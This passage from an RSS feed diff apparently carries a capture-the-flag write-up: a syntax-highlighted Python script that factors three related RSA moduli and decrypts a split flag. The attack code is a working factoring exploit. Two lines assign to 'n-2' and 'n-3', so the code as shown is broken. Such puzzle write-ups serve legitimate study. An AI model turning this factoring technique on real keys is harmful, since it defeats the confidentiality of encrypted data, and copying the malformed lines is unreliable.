+</span></span><span style="display:flex;"><span>flag2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">4952509765068005943929023031843431114540597187092738714903126772067946141703989572784140897934401082697437162345382546363262539532326425498475165138862831578872326769058104757689642323436428400734549347987121729721999216972287610017181744621923580613784280528094319337115580468333962976664642382951713734996844557627097050558648598389254848040570771430319254911664805107658029100255583056718934305481684430771282023833079529280029156492348848881417157592538442094955548441597641873477997544274413802625533454240475278118401388524163774631458900120835168954124149376210125669487879076005224324402897828069400754462817</span>
+</span></span><span style="display:flex;"><span>flag3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">832635235843260963315954320975950760182343666597438109641505827662230808005904093467755157050220263396479252248813223128489531311261338768982946110126160600744765531264253128791579206197722640752945391966957504838191737045481547210603871589545608892344858449735051695103642275193727646751872742558944213474626362348978842738127628973051301523219151083407250098830278639049985019075872996575145110830076988689935892814129057961258041944950895126632409918730985389473336802153365766599338113009784032170567987292888755868361829266838451794862482137390672574209264849235381496657497250742436985162295780366726898361475</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>n1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">17858189458331977176783205510145346242329075006164832737615260745307500777302923782391964669567649775085122681328872195823985225861546790981029181901697377617738017081303713219017671572361492390837847089196556031690974890809922884662678039254137587713002336455039498173306053994439163020453505352157698564958428447487550817456903730014043187074720704452312511793034780752764123414676884871563210725690386057007997022651617836076682803508719887751203436051121561828471343707387576953315756670760479266036148064337918362609447399308776983755240618746806694447782498244372434669071672049750668585915479351754044777991233</span>
+</span></span><span style="display:flex;"><span>n<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">27988292511630408087628435379321614455905755155908526846245303815018831647470172411594854883620030615448110055118069234326939102090454077116649426727895959703121425978302565278958246699172962990698968383263856202038742080400833395699326649141862184813455501146105201914061652698539038504126091124829475746301242565988800180930109751956393420828946755373612363675944873639709271075863889618954766614476365612770800460612362627801799559523509061850369462031748981803274498119708059567622255620759508648716908850891237844987925855021202095512750624375024412242964800063919261993198259658255269969227717249296364394728701</span>
+</span></span><span style="display:flex;"><span>n<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">38660180269440656477053314413313714739062655930125687065781703038150391320898743760212709373892830529605814753216140367569440889146085510051662809299856987103911894539082484910702016539429463270580447118064831756349229400710729340872901108067075023980052189953271797924249586371572823947426357923900405426018338108052104392652303276006930930451348478532135626424674508274264632509573012814884347342851455437267076470425745031250812060252385012112699148646763361357973846549910142450805741636272703367045063152051223051807503235461739514919589765417385756615237864412747917566329839115378785588573077455129039985274609</span>
+</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. Calculate S = 4*n2 - n1 - n3</span>
+</span></span><span style="display:flex;"><span>S <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> n2 <span style="color:#f92672">-</span> n1 <span style="color:#f92672">-</span> n3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. Solve the quadratic equation K^2 - S*K + n1*n3 = 0</span>
+</span></span><span style="display:flex;"><span>discriminant <span style="color:#f92672">=</span> S<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> n1 <span style="color:#f92672">*</span> n3
+</span></span><span style="display:flex;"><span>sqrt_discriminant <span style="color:#f92672">=</span> math<span style="color:#f92672">.</span>isqrt(discriminant)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># The two roots are K1 and K2</span>
+</span></span><span style="display:flex;"><span>K1 <span style="color:#f92672">=</span> (S <span style="color:#f92672">+</span> sqrt_discriminant) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>K2 <span style="color:#f92672">=</span> (S <span style="color:#f92672">-</span> sqrt_discriminant) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. Find the prime factors using GCD</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># K1 and K2 are a*z and c*x. We test both possibilities.</span>
+</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> math<span style="color:#f92672">.</span>gcd(n1, K1)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> a <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>: <span style="color:#75715e"># If gcd is 1, we guessed the wrong K for n1</span>
+</span></span><span style="display:flex;"><span>    a <span style="color:#f92672">=</span> math<span style="color:#f92672">.</span>gcd(n1, K2)
+</span></span><span style="display:flex;"><span>    c <span style="color:#f92672">=</span> math<span style="color:#f92672">.</span>gcd(n3, K1)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    c <span style="color:#f92672">=</span> math<span style="color:#f92672">.</span>gcd(n3, K2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>x <span style="color:#f92672">=</span> n1 <span style="color:#f92672">//</span> a
+</span></span><span style="display:flex;"><span>z <span style="color:#f92672">=</span> n3 <span style="color:#f92672">//</span> c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 4. Recover the remaining primes b and y</span>
+</span></span><span style="display:flex;"><span>b <span style="color:#f92672">=</span> (a <span style="color:#f92672">+</span> c) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>y <span style="color:#f92672">=</span> (x <span style="color:#f92672">+</span> z) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Sanity check: ensure our calculated primes multiply to n2</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> n2 <span style="color:#f92672">==</span> b <span style="color:#f92672">*</span> y
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 5. Decrypt each part of the flag</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt_part</span>(ciphertext, p, q, e, n):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Decrypts an RSA message given the prime factors.&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    phi <span style="color:#f92672">=</span> (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    d <span style="color:#f92672">=</span> pow(e, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, phi)
+</span></span><span style="display:flex;"><span>    plaintext_int <span style="color:#f92672">=</span> pow(ciphertext, d, n)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Convert the resulting integer to bytes</span>
+</span></span><span style="display:flex;"><span>    byte_length <span style="color:#f92672">=</span> (plaintext_int<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> plaintext_int<span style="color:#f92672">.</span>to_bytes(byte_length, <span style="color:#e6db74">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Decrypt and get the byte representation of each flag part</span>
+</span></span><span style="display:flex;"><span>part1_bytes <span style="color:#f92672">=</span> decrypt_part(flag1, a, x, e, n1)
+</span></span><span style="display:flex;"><span>part2_bytes <span style="color:#f92672">=</span> decrypt_part(flag2, b, y, e, n2)
+</span></span><span style="display:flex;"><span>part3_bytes <span style="color:#f92672">=</span> decrypt_part(flag3, c, z, e, n3)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 6. Combine the parts and print the result</span>
+</span></span><span style="display:flex;"><span>full_flag <span style="color:#f92672">=</span> part1_bytes <span style="color:#f92672">+</span> part2_bytes <span style="color:#f92672">+</span> part3_bytes
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;✅ The decrypted flag is:&#34;</span>)
+</span></span><span style="display:flex;"><span>print(full_flag<span style="color:#f92672">.</span>decode())
+</span></span></code></pre></div>]]></content>
+		</item>
+		
+	</channel>
 </rss>
